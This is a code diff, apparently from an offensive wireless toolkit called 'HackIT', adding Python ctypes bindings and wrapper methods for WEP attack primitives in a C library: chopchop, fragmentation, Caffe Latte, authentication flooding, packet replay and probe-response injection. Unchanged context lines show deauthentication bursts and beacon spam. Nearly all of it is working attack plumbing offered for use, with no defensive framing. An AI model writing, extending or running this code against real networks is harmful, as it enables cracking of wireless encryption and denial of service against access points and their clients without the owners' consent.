@@ -91,6 +91,19 @@ class EngineBridge:
             _sig("hackit_inject_deauth", [ctypes.c_char_p, u8p, u8p, ctypes.c_uint16], ctypes.c_bool)
             _sig("hackit_inject_beacon", [ctypes.c_char_p, ctypes.c_char_p, u8p, ctypes.c_uint8], ctypes.c_bool)
             _sig("hackit_inject_raw_frame", [ctypes.c_char_p, u8p, ctypes.c_int], ctypes.c_bool)
+            # WEP injection primitives
+            _sig("hackit_inject_chopchop_attack",
+                 [ctypes.c_char_p, u8p, u8p, u8p, ctypes.POINTER(ctypes.c_int)], ctypes.c_int)
+            _sig("hackit_inject_frag_attack",
+                 [ctypes.c_char_p, u8p, u8p, ctypes.c_int], ctypes.c_int)
+            _sig("hackit_inject_caffe_latte",
+                 [ctypes.c_char_p, u8p, u8p, ctypes.c_int], ctypes.c_int)
+            _sig("hackit_inject_auth_flood",
+                 [ctypes.c_char_p, u8p, ctypes.c_int], ctypes.c_int)
+            _sig("hackit_inject_packet_replay",
+                 [ctypes.c_char_p, u8p, ctypes.c_int, ctypes.c_int, ctypes.c_int], ctypes.c_int)
+            _sig("hackit_inject_proberesp",
+                 [ctypes.c_char_p, ctypes.c_char_p, u8p, ctypes.c_uint8], ctypes.c_bool)
             _sig("hackit_deauth_burst", [ctypes.c_char_p, u8p, u8p, ctypes.c_int, ctypes.c_int], ctypes.c_bool)
             _sig("hackit_deauth_all_clients", [ctypes.c_char_p, u8p, ctypes.c_int], ctypes.c_bool)
             _sig("hackit_deauth_targeted", [ctypes.c_char_p, u8p, u8p, ctypes.c_int], ctypes.c_bool)
@@ -645,6 +658,47 @@ class EngineBridge:
         if not self._c_cli:
             raise EngineBuildError("C CLI not built. Run 'build c' first.")
         return self._popen([self._c_cli, "beacons", iface, payload or "HackIT_WiFi"])
+
+    def c_chopchop(self, iface: str, bssid: str, station: str = "") -> tuple[int, bytes]:
+        """Run the chopchop attack primitive. Returns (bytes_sent, captured_packet)."""
+        import ctypes
+        lib = self.c_lib()
+        if lib is None:
+            raise EngineBuildError("C shared library not loaded.")
+        out_buf = (ctypes.c_uint8 * 2048)()
+        out_len = ctypes.c_int(0)
+        rc = int(lib.hackit_inject_chopchop_attack(
+            iface.encode(), self._mac_bytes(bssid),
+            self._mac_bytes(station or "FF:FF:FF:FF:FF:FF"),
+            out_buf, ctypes.byref(out_len),
+        ))
+        return rc, bytes(out_buf[:out_len.value])
+
+    def c_frag_attack(self, iface: str, bssid: str, station: str = "", frag_size: int = 64) -> int:
+        lib = self.c_lib()
+        if lib is None:
+            raise EngineBuildError("C shared library not loaded.")
+        return int(lib.hackit_inject_frag_attack(
+            iface.encode(), self._mac_bytes(bssid),
+            self._mac_bytes(station or "FF:FF:FF:FF:FF:FF"), int(frag_size),
+        ))
+
+    def c_caffe_latte(self, iface: str, bssid: str, station: str = "") -> int:
+        lib = self.c_lib()
+        if lib is None:
+            raise EngineBuildError("C shared library not loaded.")
+        return int(lib.hackit_inject_caffe_latte(
+            iface.encode(), self._mac_bytes(bssid),
+            self._mac_bytes(station or "FF:FF:FF:FF:FF:FF"), 5,
+        ))
+
+    def c_auth_flood(self, iface: str, bssid: str, count: int = 100) -> int:
+        lib = self.c_lib()
+        if lib is None:
+            raise EngineBuildError("C shared library not loaded.")
+        return int(lib.hackit_inject_auth_flood(
+            iface.encode(), self._mac_bytes(bssid), int(count),
+        ))
 
     # ── C# execution (Windows) ─────────────────────────────────
 
